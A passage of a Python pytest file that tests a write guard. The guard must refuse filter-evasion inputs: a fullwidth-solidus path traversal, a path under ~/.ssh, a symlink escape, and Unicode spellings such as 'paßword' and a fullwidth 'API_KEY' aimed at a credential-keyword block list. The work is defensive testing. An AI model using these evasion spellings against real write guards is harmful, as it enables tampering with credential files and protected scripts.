    def test_hostile_spellings_are_refused(self, repo, spelling):
        with pytest.raises(WriteRefused):
            _auth(repo, spelling)

    def test_a_tilde_spelling_is_refused_by_the_pre_join_rule_alone(self, repo):
        """Found by mutation testing: this is the only input that rule defends.

        Deleting the pre-join refusal left the whole suite green, because every
        absolute path is independently caught by ``is_hard_stop`` (it refuses a
        leading ``/``) and ``~/.ssh/authorized_keys`` happens to be caught by the
        restricted word "auth". ``~/notes.md`` is masked by neither: the rules
        say nothing about it, and containment would happily admit it as a
        literal directory named ``~`` inside the repository. So this input, and
        only this input, makes that rule falsifiable.
        """
        assert is_hard_stop("~/notes.md") is False
        with pytest.raises(WriteRefused):
            _auth(repo, "~/notes.md")
        assert not (repo / "~").exists(), "a refused write created a '~' directory"


class TestFoldingIsAppliedToBothHalvesAndInTheRightOrder:
    """Also found by mutation testing — two rules with exactly one witness each."""

    @pytest.mark.parametrize(
        "spelling", ["paßword", "PAßWORD"], ids=["sharp_s", "sharp_s_upper"]
    )
    def test_case_folding_is_casefold_and_not_lower(self, repo, spelling):
        """The witness the fullwidth cases could not be.

        My round-2 mutation replaced the whole fold with ``.lower()`` and was
        caught — but only because it dropped NFKC too. The sharper mutation,
        ``casefold()`` -> ``lower()`` with NFKC intact, survived the entire
        suite, because NFKC had already reduced every fullwidth witness to plain
        ASCII before the fold ran. Nothing tested the fold itself.

        A German sharp s is the discriminator: NFKC leaves it alone (it has no
        compatibility decomposition), ``lower()`` leaves it alone, and only
        ``casefold()`` maps it to ``ss`` — so ``paßword`` matches "password"
        under the real implementation and evades it under the mutant.
        """
        assert "password" not in spelling.lower()
        assert "password" in unicodedata.normalize("NFKC", spelling).casefold()
        assert is_hard_stop("configs/swarm.yaml", spelling) is True
        with pytest.raises(WriteRefused):
            _auth(repo, "configs/swarm.yaml", key=spelling, confine_to="configs")

    def test_case_folding_applies_to_the_path_as_well_as_the_key(self, repo):
        """Same discriminator, other half of the rule."""
        assert is_hard_stop("configs/paßword.yaml") is True
        with pytest.raises(WriteRefused):
            _auth(repo, "configs/paßword.yaml", confine_to="configs")

    def test_a_lookalike_key_is_folded(self, repo):
        """The PATH is NFKC-folded on its way through ``normalise_target_path``;
        the KEY is not, so the key is the only input that proves the fold reaches
        the second half of the rule. Fullwidth letters have fullwidth lowercase
        forms, so ``.lower()`` alone leaves the spelling unmatched.
        """
        assert "api_key" not in "ＡＰＩ＿ＫＥＹ".lower()
        assert is_hard_stop("configs/swarm.yaml", "ＡＰＩ＿ＫＥＹ") is True
        with pytest.raises(WriteRefused):
            _auth(repo, "configs/swarm.yaml", key="ＡＰＩ＿ＫＥＹ", confine_to="configs")

    def test_compatibility_folding_happens_before_the_path_is_collapsed(self, repo):
        """A fullwidth solidus is not a separator until NFKC makes it one.

        ``docs／..／scripts/merge-gate.sh`` collapses to ``scripts/merge-gate.sh``
        only if the fold runs BEFORE ``normpath``. Run it after and normpath sees
        one opaque component, nothing collapses, and the traversal survives — so
        the order of those two lines is load-bearing, and this pins it.
        """
        assert normalise_target_path("docs／..／scripts/merge-gate.sh") == "scripts/merge-gate.sh"
        with pytest.raises(WriteRefused):
            _auth(repo, "docs／..／scripts/merge-gate.sh")

    def test_the_repo_root_itself_is_not_a_write_target(self, repo):
        with pytest.raises(WriteRefused):
            _auth(repo, ".")

    def test_confinement_is_decided_on_filesystem_truth(self, repo):
        """``configs/scripts_link/x.sh`` is spelled under configs/ and is not."""
        with pytest.raises(WriteRefused):
            _auth(repo, "configs/scripts_link/x.sh", confine_to="configs")
        # ...and the plainly-outside case still refuses.
        with pytest.raises(WriteRefused):
            _auth(repo, "docs/lessons/x.yaml", confine_to="configs")
